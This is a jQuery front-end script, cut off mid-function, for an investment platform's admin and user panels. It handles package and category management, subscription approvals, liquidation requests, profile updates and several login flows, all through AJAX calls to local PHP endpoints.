$(document).ready(function(){
if($('table').length) {
    console.log('Table Alert');
    $('table').DataTable();
}
//sam's 15-05-2020 starts//

//   $('#category_det').change(function(){
//             var catid = $(this).val();
//             alert(catid);
//     //         	$.ajax({
// 				// 		url:"ajax_admin/display_unique_packages.php",
// 				// 		method:"POST",
// 				// 		data:{catid:catid},
// 				// 		success:function(data){
//     //             		$('#display_current_image_pack').html(data);
// 				// 		}ver
// 				// 	});
//     });



    //verify_account 
     	$('#verify_account').click(function(e){
			e.preventDefault();
		  var account_number = $('#account_number').val();
		  var bank_name = $('#bank_name').val();
		  //alert(account_number);
		  //alert(bank_name);
                	$.ajax({
						url:"ajax_scripts/get_user_verification_details.php",
						method:"POST",
						data:{ account_number: account_number, bank_name:bank_name},
                        // beforeSend: function(){
                        //              $('#display_details').html('please wait...');
                        // },
						success:function(data){
						           $('#display_details').html(data);
						}
			
						});
		
	
		
	});


        //disapprove military sub 
     	$('.disapprove_military').click(function(e){
			e.preventDefault();
		    var uniqueid22 = $(this).attr('id');
            
			
			
                	$.ajax({
						url:"ajax_admin/disapprove_military_subscription.php",
						method:"POST",
						data:{uniqueid22:uniqueid22},
						success:function(data){
                		//alert(data);
                			if(data == 200){
							$.alert({
							title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "You have successfully disapproved military subscription request."
							});
						   //setTimeout( function(){ window.location.href = "pending_military_package";}, 7000);
					    	$('.disapprove_modal').modal("hide");
							$('#disapprove_military_modal'+id).html("<small class='badge badge-danger'>Disapproved</small>");
					    	}
					    	else{
					    	    
                            $.alert({
                              title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
                              closeAnimation: 'left',content: data
                            });
					    	    
					    	}
                     
						
						}
						});
		
	
		
	});

         //approve military sub 
    	$('.approve_military').click(function(e){
			e.preventDefault();
		    var uniqueid22 = $(this).attr('id');
            
			
			
                	$.ajax({
						url:"ajax_admin/approve_military_subscription.php",
						method:"POST",
						data:{uniqueid22:uniqueid22},
						success:function(data){
                		//alert(data);
                			if(data == 200){
							$.alert({
							title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "You have successfully approved military subscription request."
							});
							$('.approve_modal').modal("hide");
							$('#approve_military_modal'+id).html("<small class='badge badge-success'>Approved</small>");
						   //setTimeout( function(){ window.location.href = "pending_military_package";}, 7000);
					    	}
					    	else{
					    	    
                            $.alert({
                              title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
                              closeAnimation: 'left',content: data
                            });
					    	    
					    	}
                     
						
						}
						});
		
	
		
	});

        
        
    
    	$('#cmd_liquidate').click(function(e){
			e.preventDefault();
			
                	$.ajax({
						url:"ajax_scripts/liquidate_investment.php",
						method:"POST",
						data:$('#liquidate_form').serialize(),
						success:function(data){
                		//alert(data);
                			if(data == "success"){
							$.alert({
							title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "You have successfully sent request for liquidation. You will be contacted as soon as the liquidation process is completed."
							});
						   setTimeout( function(){ window.location.href = "mypackages";}, 7000);
						}
                        
                        if(data == "exists"){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "Oops...The liquidation request has been sent already."
							});
						}
					

						if(data == "failed"){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "Oops...The liquidation process failed."
							});
						}
						
						}
						});
		
	
		
	});



	$('#package_name_img').change(function(e){
			e.preventDefault();
			var package_id = $(this).val();
			//alert(package_id);
		
		
                	$.ajax({
						url:"ajax_admin/update_package_image.php",
						method:"POST",
						data:$('#cat_img_form').serialize(),
						success:function(data){
                		$('#display_current_image_pack').html(data);
						}
						});
		
	
		
	});
	
	
	$('#category_name_img').change(function(e){
			e.preventDefault();
			var package_id = $(this).val();
			//alert(package_id);
		
		
                	$.ajax({
						url:"ajax_admin/update_category_image.php",
						method:"POST",
						data:$('#category_img_form').serialize(),
						success:function(data){
                		$('#display_current_image_pack').html(data);
						}
						});
		
	
		
	});

 $('#create_package').click(function(e){
			e.preventDefault();
            let package_description = CKEDITOR.instances['package_description'].getData();
		    let  package_name = $("#package_name").val();
		    let  package_category = $("#package_category").val();
		    let  package_type = $("#package_type").val();
		    let  package_unit_price = $("#package_unit_price").val();
		    let  min_no_slots = $("#min_no_slots").val();
		    let  moratorium = $("#moratorium").val();
		    let  free_liquidation_period = $("#free_liquidation_period").val();
		    let  liquidation_surcharge = $("#liquidation_surcharge").val();
		    let  tenure_of_product = $("#tenure_of_product").val();
		    let  float_time = $("#float_time").val();
		    let  multiplying_factor = $("#multiplying_factor").val();
		    let  capital_refund = $("#capital_refund").val();
		    let  capital_refund_days = $("#capital_refund_days").val();
		    let  backdatable = $("#backdatable").val();
		    let  no_of_slots = $("#no_of_slots").val();
		    let  visibility = $("#visibility").val();
		    let  package_commission = $("#package_commission").val();

		   	//alert(package_name);

		   	if(package_type == '1'){

		   			$.ajax({
						url:"ajax_admin/create_fixed_package.php",
						method:"POST",
						data: {package_description:package_description,package_name:package_name,package_category:package_category,
							package_type:package_type,package_unit_price:package_unit_price,min_no_slots:min_no_slots,moratorium:moratorium,
							free_liquidation_period:free_liquidation_period,liquidation_surcharge:liquidation_surcharge,
							tenure_of_product:tenure_of_product,float_time:float_time,multiplying_factor:multiplying_factor,capital_refund:capital_refund, capital_refund_days:capital_refund_days,
							backdatable:backdatable,no_of_slots:no_of_slots,visibility:visibility,package_commission:package_commission},
						
						success:function(data){
				
                		//	alert(data+"yes");
						if(data == 200){
							$.alert({
							title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "You have successfully created the package: "+package_name+" "
							});
						   setTimeout( function(){ window.location.href = "view_packages";}, 4000);
						}

						if(data == 300){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "Some fields are empty"
							});
						}


	                    if(data == 400){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "This package has been created already"
							});
						}

						if(data == 500){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "Please check all parameters carefully"
							});
						}


					



							// setTimeout( function(){ window.location.href = "profile";}, 4000);
							}	


						
						});
		   	}

		   	if(package_type == '2'){

				let  recurrence_value = $("#recurrence_value").val();
				let  contribution_period = $("#contribution_period").val();
				let  incubation_period = $("#incubation_period").val();
				let  recurrence_type = $("#recurrence_type").val();

		   		$.ajax({
						url:"ajax_admin/create_recurrent_package.php",
						method:"POST",
						data: {recurrence_value:recurrence_value,contribution_period:contribution_period,incubation_period:incubation_period,recurrence_type:recurrence_type,package_description:package_description,package_name:package_name,package_category:package_category,
							package_type:package_type,package_unit_price:package_unit_price,min_no_slots:min_no_slots,moratorium:moratorium,
							free_liquidation_period:free_liquidation_period,liquidation_surcharge:liquidation_surcharge,
							tenure_of_product:tenure_of_product,float_time:float_time,multiplying_factor:multiplying_factor,capital_refund:capital_refund,capital_refund_days:capital_refund_days,
							backdatable:backdatable,no_of_slots:no_of_slots,visibility:visibility,package_commission:package_commission},
						
						success:function(data){
				
                		//	alert(data+"yes");
						if(data == 200){
							$.alert({
							title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "You have successfully created this recurrent package: "+package_name+" "
							});
						   setTimeout( function(){ window.location.href = "view_packages";}, 4000);
						}

						if(data == 300){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "Some fields are empty"
							});
						}


	                    if(data == 400){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "This package has been created already"
							});
						}

						if(data == 500){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "Please check all parameters carefully"
							});
						}


					



							// setTimeout( function(){ window.location.href = "profile";}, 4000);
							}	


						
						});

		   	}
              
		    
		
	});




	 $('#edit_package').click(function(e){
			e.preventDefault();
            let package_description = CKEDITOR.instances['package_description'].getData();
		    let  package_name = $("#package_name").val();
		    let  package_category = $("#package_category").val();
		    let  package_type = $("#package_type").val();
		    let  package_unit_price = $("#package_unit_price").val();
		    let  min_no_slots = $("#min_no_slots").val();
		    let  moratorium = $("#moratorium").val();
		    let  free_liquidation_period = $("#free_liquidation_period").val();
		    let  liquidation_surcharge = $("#liquidation_surcharge").val();
		    let  tenure_of_product = $("#tenure_of_product").val();
		    let  float_time = $("#float_time").val();
		    let  multiplying_factor = $("#multiplying_factor").val();
		    let  capital_refund = $("#capital_refund").val();
		   // let $capital_refund = $("#capital_refund").val();
		    let  backdatable = $("#backdatable").val();
		    let  no_of_slots = $("#no_of_slots").val();
		    let  visibility = $("#visibility").val();
		    let  package_commission = $("#package_commission").val();
		    let  package_id = $("#package_id").val();

		   	//alert(package_name);

		   	if(package_type == '1'){

		   			$.ajax({
						url:"ajax_admin/update_fixed_package.php",
						method:"POST",
						data: {package_id:package_id,package_description:package_description,package_name:package_name,package_category:package_category,
							package_type:package_type,package_unit_price:package_unit_price,min_no_slots:min_no_slots,moratorium:moratorium,
							free_liquidation_period:free_liquidation_period,liquidation_surcharge:liquidation_surcharge,
							tenure_of_product:tenure_of_product,float_time:float_time,multiplying_factor:multiplying_factor,capital_refund:capital_refund,
							backdatable:backdatable,no_of_slots:no_of_slots,visibility:visibility,package_commission:package_commission},
						
						success:function(data){
				
                		//	alert(data+"yes");
						if(data == 200){
							$.alert({
							title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "You have successfully updated the package: "+package_name+" "
							});
						   setTimeout( function(){ window.location.href = "view_packages";}, 4000);
						}

						if(data == 300){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "Some fields are empty"
							});
						}


	                    if(data == 400){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "This package has been created already"
							});
						}

							if(data == 500){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "Please check all parameters carefully"
							});
						}


					



							// setTimeout( function(){ window.location.href = "profile";}, 4000);
							}	


						
						});
		   	}

		   	if(package_type == '2'){

				let  recurrence_value = $("#recurrence_value").val();
				let  contribution_period = $("#contribution_period").val();
				let  incubation_period = $("#incubation_period").val();
				let  recurrence_type = $("#recurrence_type").val();
                
		   		$.ajax({
						url:"ajax_admin/update_recurrent_package.php",
						method:"POST",
						data: {package_id:package_id,recurrence_value:recurrence_value,contribution_period:contribution_period,incubation_period:incubation_period,recurrence_type:recurrence_type,package_description:package_description,package_name:package_name,package_category:package_category,
							package_type:package_type,package_unit_price:package_unit_price,min_no_slots:min_no_slots,moratorium:moratorium,
							free_liquidation_period:free_liquidation_period,liquidation_surcharge:liquidation_surcharge,
							tenure_of_product:tenure_of_product,float_time:float_time,multiplying_factor:multiplying_factor,capital_refund:capital_refund,
							backdatable:backdatable,no_of_slots:no_of_slots,visibility:visibility,package_commission:package_commission},
						
						success:function(data){
				
                		//	alert(data+"yes");
						if(data == 200){
							$.alert({
							title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "You have successfully updated this recurrent package: "+package_name+" "
							});
						   setTimeout( function(){ window.location.href = "view_packages";}, 4000);
						}

						if(data == 300){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "Some fields are empty"
							});
						}


	                    if(data == 400){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "This package has been created already"
							});
						}

						if(data == 500){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "Please check all parameters carefully"
							});
						}



					



							// setTimeout( function(){ window.location.href = "profile";}, 4000);
							}	


						
						});

		   	}
              
		    
		
	});



 $('#cmd_create_cat').click(function(e){
			e.preventDefault();
         let package_description = CKEDITOR.instances['package_description'].getData();
		    let cat_name = $("#cat_name").val();

		    //alert(cat_name);
		   
              $.ajax({
						url:"ajax_admin/create_category.php",
						method:"POST",
						data: {package_description:package_description,cat_name:cat_name},
						
						success:function(data){

							//alert(data);
				
                			
						if(data == 200){
							$.alert({
							title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "You have successfully created this category..."
							});
						   setTimeout( function(){ window.location.href = "view_categories";}, 4000);
						}

					   if(data == 300){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "Some fields are empty"
							});
						}

							if(data == 400){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "This package category exists"
							});
						}

			

	                    if(data == 500){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "Server Error"
							});
						}


					



							// setTimeout( function(){ window.location.href = "profile";}, 4000);
							}	


						
						});
		    
		
	});



  $('#cmd_edit_cat').click(function(e){
			e.preventDefault();
            let package_description = CKEDITOR.instances['package_description'].getData();
		    let cat_name = $("#cat_name").val();
		    let cat_id = $("#cat_id").val();
		   // $('#display_results'+unique_id).empty();
              $.ajax({
						url:"ajax_admin/update_category.php",
						method:"POST",
						data: {package_description:package_description,cat_name:cat_name,cat_id:cat_id},
						
						success:function(data){
				
                		// $('#display_results'+unique_id).html("<div style='background-color:lightgrey;'>"+data+"</div>");
							
						if(data == 200){
							$.alert({
							title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "You have successfully updated this category..."
							});
						   setTimeout( function(){ window.location.href = "view_categories";}, 4000);
						}

							if(data == 300){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "Some fields are empty"
							});
						}


	                    if(data == 400){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "You cannot change package category to this because it exists."
							});
						}

						 if(data == 500){
							$.alert({
							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
							closeAnimation: 'left',content: "Server Error"
							});
						}


					



							// setTimeout( function(){ window.location.href = "profile";}, 4000);
							}	


						
						});
		    
		
	});
 
 
 $('.cmd_subscribe_pack222').click(function(e){
        e.preventDefault();
            alert('sdfsdfsdfsdfOOOOOOO');
 });	
	
 

//  $('.cmd_subscribe_pack').click(function(e){
// 			e.preventDefault();
// 		    let unique_id = $(this).attr('id');
// 		    //alert('unique_id');
// 		    $('#display_results'+unique_id).empty();
//               $.ajax({
// 						url:"ajax_scripts/subscribe_to_package.php",
// 						method:"POST",
// 						data: $('#subscribe_pack_form'+unique_id).serialize(),
						
// 						success:function(data){
				
//                 		// $('#display_results'+unique_id).html("<div style='background-color:lightgrey;'>"+data+"</div>");
							
// 						if(data == 300){
// 							$.alert({
// 							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
// 							closeAnimation: 'left',content: "Please enter number of slots to buy"
// 							});
// 						}

// 							if(data == 400){
// 							$.alert({
// 							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
// 							closeAnimation: 'left',content: "Please agree to terms and conditions"
// 							});
// 						}


// 						if(data == 500){
// 							$.alert({
// 							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
// 							closeAnimation: 'left',content: "You cannot buy more than available slots"
// 							});
// 						}

					
// 							if(data == 600){
// 							$.alert({
// 							title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
// 							closeAnimation: 'left',content: "You cannot buy less than the minimum slot"
// 							});
// 						}


// 						if(data == 700){
// 							$.alert({
// 							title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
// 							closeAnimation: 'left',content: "Insufficient wallet balance. Fund your wallet"
// 							});
// 						}

// 							if(data == 800){
// 							$.alert({
// 							title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
// 							closeAnimation: 'left',content: "Transaction Log Insertion Error"
// 							});
// 						}

// 							if(data == 900){
// 							$.alert({
// 							title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
// 							closeAnimation: 'left',content: "Something went wrong"
// 							});
// 						}
						
// 						if(data == 1000){
// 							$.alert({
// 							title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
// 							closeAnimation: 'left',content: "Your Wallet has been deactivated, please contact FarmKonnect for more information"
// 							});
// 						}

// 							if(data == 200){
// 							$.alert({
// 							title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
// 							closeAnimation: 'left',content: "You have successfully subscribed to this package, you will be redirected shortly..."
// 							});
// 						   setTimeout( function(){ window.location.href = "mypackages";}, 4000);

// 						}



// 							// setTimeout( function(){ window.location.href = "profile";}, 4000);
// 							}	


						
// 						});
		    
		
// 	});
	
	


// 	$('.cmd_subscribe_pack_military').click(function(e){
// 			e.preventDefault();
// 		    var unique_id = $(this).attr('id');
// 		    //alert(unique_id);
// 		    $('#display_results'+unique_id).empty();
//               $.ajax({
// 						url:"ajax_scripts/send_request_military.php",
// 						method:"POST",
// 						data: $('#subscribe_pack_form'+unique_id).serialize(),
						
// 						success:function(data){
// 				        //alert(data);
//                 		// $('#display_results'+unique_id).html("<div style='background-color:lightgrey;'>"+data+"</div>");
							
// 						if(data == 300){
// 							$.alert({
// 							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
// 							closeAnimation: 'left',content: "Please enter number of slots to buy"
// 							});
// 						}

// 						if(data == 400){
// 							$.alert({
// 							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
// 							closeAnimation: 'left',content: "Please agree to terms and conditions"
// 							});
// 						}


// 						if(data == 500){
// 							$.alert({
// 							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
// 							closeAnimation: 'left',content: "You cannot buy more than available slots"
// 							});
// 						}

					
//                       if(data == 600){
//                         $.alert({
//                         title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
//                         closeAnimation: 'left',content: "You cannot buy less than the minimum slot"
//                         });
//                         }


						
//                         if(data == 900){
//                         $.alert({
//                         title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
//                         closeAnimation: 'left',content: "Something went wrong"
//                         });
//                         }
						
						
// 						if(data == 1000){
// 							$.alert({
// 							title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
// 							closeAnimation: 'left',content: "Oops! You have a pending request"
// 							});
// 						}
					

//                         if(data == 200){
//                         $.alert({
//                         title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
//                         closeAnimation: 'left',content: "You have successfully sent a subscription request for military package, Kindly ensure you have sufficient money in your wallet to ensure successful approval. You will be redirected shortly..."});
//                         setTimeout( function(){ window.location.href = "mypackages";}, 4000);
                        
//                         }


// 						} ///close function
						
// 						});
		    
		
// 	});





$('#package_type').change(function(e){
			e.preventDefault();
		    var package_type = $(this).val();
		    $('#display').empty();

		    if(package_type == '2'){
              $.ajax({
						url:"ajax_admin/recurrent_pack_feature.php",
						method:"GET",
						
						success:function(data){
				
                		$('#display').html(data);


						}
						});
		    }
		
	});





////

/////////////later codes//////////
   
	
/////////////later codes//////////
   
	

    
	$('#credit_wallet').click(function(e){
			e.preventDefault();
		   $('#exampleModalScrollableCre').modal('show');
		    //alert('testt');
	});

$('#credit_user_wallet').click(function(e){
			e.preventDefault();
		   $('#exampleModalScrollable').modal('show');
		    //alert('testt');
	});
	



  	
	$('#package_plan_fix').change(function(e){
			e.preventDefault();
			var package_plan = $(this).val();
			if(package_plan == ''){
				alert('fill something...');
			}
			if(package_plan == 'standard_packages'){
              
              			$.ajax({
						url:"ajax_admin/standard_packages.php",
						method:"GET",
						data:$('#update_basic_form').serialize(),
						success:function(data){
				
                		$('#display').html(data);


						}
						});



			}
			if(package_plan == 'term_packages'){
                	$.ajax({
						url:"ajax_admin/term_packages.php",
						method:"GET",
						data:$('#update_basic_form').serialize(),
						success:function(data){
						
                		$('#display').html(data);


						}
						});

			}
		
	});




	$('#package_plan_rec').change(function(e){
			e.preventDefault();
			var package_plan = $(this).val();
			if(package_plan == ''){
				alert('fill something...');
			}
		
			if(package_plan == 'basal_daily'){
                	$.ajax({
						url:"ajax_admin/basal_daily.php",
						method:"GET",
						data:$('#update_basic_form').serialize(),
						success:function(data){
                		$('#display').html(data);
						}
						});
			}
			if(package_plan == 'basal_monthly'){
                	$.ajax({
						url:"ajax_admin/basal_monthly.php",
						method:"GET",
						data:$('#update_basic_form').serialize(),
						success:function(data){
                		$('#display').html(data);
						}
						});
			}
	
		
	});


	//basic profile
	$('#update_basic_profile').click(function(e){
			e.preventDefault();
			$.ajax({
			url:"ajax_scripts/update_user.php",
			method:"POST",
			data:$('#update_basic_form').serialize(),
			success:function(data){
			 if(data == 200){
			 $.alert({
			 title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			 closeAnimation: 'left',content: "Your Profile has been updated Successfully"
			 });
			 setTimeout( function(){ window.location.href = "profile";}, 4000);
			 }
			 
			 else if(data == 600){

			 $.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error! Empty field(s) found, Please fill all fields"
			 });
			 }

			 else{

			 $.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in Updating"
			 });
			 }
			//alert(data);

			}
			});
		
	});




	/////updated above 19,20-03-2020 not yet merged


	///bank profile
	$('#update_bank_profile').click(function(e){
			e.preventDefault();
			$.ajax({
			url:"ajax_scripts/update_bank_details.php",
			method:"POST",
			data:$('#update_bank_form').serialize(),
			success:function(data){
			 if(data == 200){
			 $.alert({
			 title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			 closeAnimation: 'left',content: "Your Bank details has been updated Successfully"
			 });
			 setTimeout( function(){ window.location.href = "profile";}, 4000);
			 }
			 
			  else if(data == 600){

			 $.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error! Empty field(s), Please fill all fields"
			 });
			 }
			 else{

			 $.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in Updating"
			 });
			 }
			//alert(data);

			}
			});
		
	});


 // nok profile
 		$('#update_nok_profile').click(function(e){
			e.preventDefault();
			$.ajax({
			url:"ajax_scripts/update_next_of_kin.php",
			method:"POST",
			data:$('#update_nok_form').serialize(),
			success:function(data){
			 if(data == 200){
			 $.alert({
			 title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			 closeAnimation: 'left',content: "Your Next of Kin details has been updated Successfully"
			 });
			 setTimeout( function(){ window.location.href = "profile";}, 4000);
			 }
			 
			 else if(data == 600){

			 $.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error! Empty field(s) found, Please fill all fields"
			 });
			 }
			 else{

			 $.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in Updating"
			 });
			 }
			//alert(data);

			}
			});
		
	});




////////////lates codes ends here//////////////




//start user login
$('#login').click(function(e){
e.preventDefault();
$.ajax({
  beforeSend: function(){
  		$('#login').text('logging...');
  		$('#login').attr('disabled', true);
  },
  url:"ajax_scripts/authenticate.php",
  method:"POST",
  data:$('#login_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Login was successful"
		});
		setTimeout( function(){ window.location.href = "home";}, 4000);
	 }
	 else if(data == "incorrect_email_or_password"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Incorrect Email Address or Password"
		});
	 }

	 else if(data == "login_failed"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "You account has been blocked, please click on forgot password"
		});
	 }
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error Logging in"
		});
	 }

	 $('#login').text('Login');
  	 $('#login').attr('disabled', false);
		
  }

  });

	

});

//start admin login
$('#admin_login').click(function(e){
e.preventDefault();
$.ajax({
	beforeSend: function(){
  		$('#admin_login').text('logging...');
  		$('#admin_login').attr('disabled', true);
  },
  url:"ajax_admin/admin_authenticate.php",
  method:"POST",
  data:$('#admin_login_form').serialize(),
  success:function(data){
  	//alert(data.substring(0,7));
	 if(data.substring(0,7) == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Login was successful"
		});
	 	
		setTimeout( function(){ window.location.href = "home";}, 4000);
	 }

	  else if(data == "login_failed"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "You account has been blocked, please click on forgot password"
		});
	 }

	 else if(data == "incorrect_email_or_password"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Incorrect Email Address or Password"
		});
	 }

    else if(data == 1){
		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Login was successful"
		});
	 	
		setTimeout( function(){ window.location.href = "cash_officer_home";}, 4000);
	 }
	 else if(data == 2){
		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Login was successful"
		});
	 	
		setTimeout( function(){ window.location.href = "lead_officer_home";}, 4000);
	 }

	 else if(data == 3){
		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Login was successful"
		});
	 	
		setTimeout( function(){ window.location.href = "feedback_officer_home";}, 4000);
	 }

	 else if(data == 4){
		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Login was successful"
		});
	 	
		setTimeout( function(){ window.location.href = "BE_home";}, 4000);
	 }

	 else if(data == 5){
		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Login was successful"
		});
	 	
		setTimeout( function(){ window.location.href = "MM_home";}, 4000);
	 }
	 else if(data == 6){
		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Login was successful"
		});
	 	
		setTimeout( function(){ window.location.href = "accountant_home";}, 4000);
	 }
	 
	 else if(data == 7){
		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Login was successful"
		});
	 	
		setTimeout( function(){ window.location.href = "IM_home";}, 4000);
	 }
	 
	 else if(data == 8){
		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Login was successful"
		});
	 	
		setTimeout( function(){ window.location.href = "crm_home";}, 4000);
	 }

	 else if(data == 20){
		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Login was successful"
		});
	 	
		setTimeout( function(){ window.location.href = "migration/";}, 4000);
	 }

     else if(data == 'no_access'){
		$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "You have either been sacked or suspended. Contact you Marketing Manager for more details"
		});
	 }

	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error Logging in"
		});
	 }

	$('#admin_login').text('Login');
  	 $('#admin_login').attr('disabled', false);
		
  }

  });
});
//end admin login

//end admin login

//start aff login
$('#aff_login').click(function(e){
e.preventDefault();
$.ajax({
  url:"ajax_aff/affiliate_authenticate.php",
  method:"POST",
  data:$('#aff_login_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Login was successful"
		});
		setTimeout( function(){ window.location.href = "home";}, 4000);
	 }	
	 else if(data == "login_failed"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "You account has been blocked, please click on forgot password"
		});
	 }
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error Logging in"
		});
	 }
	// alert(data);
		
  }
  });
});
//end aff login




//start forgot password
$('#forgot_password').click(function(e){
e.preventDefault();
$.ajax({
  url:"ajax_scripts/forgot_pword.php",
  method:"POST",
  data:$('#forgot_password_form').serialize(),
  success:function(data){
	 if(data == 200){
	 		$.alert({
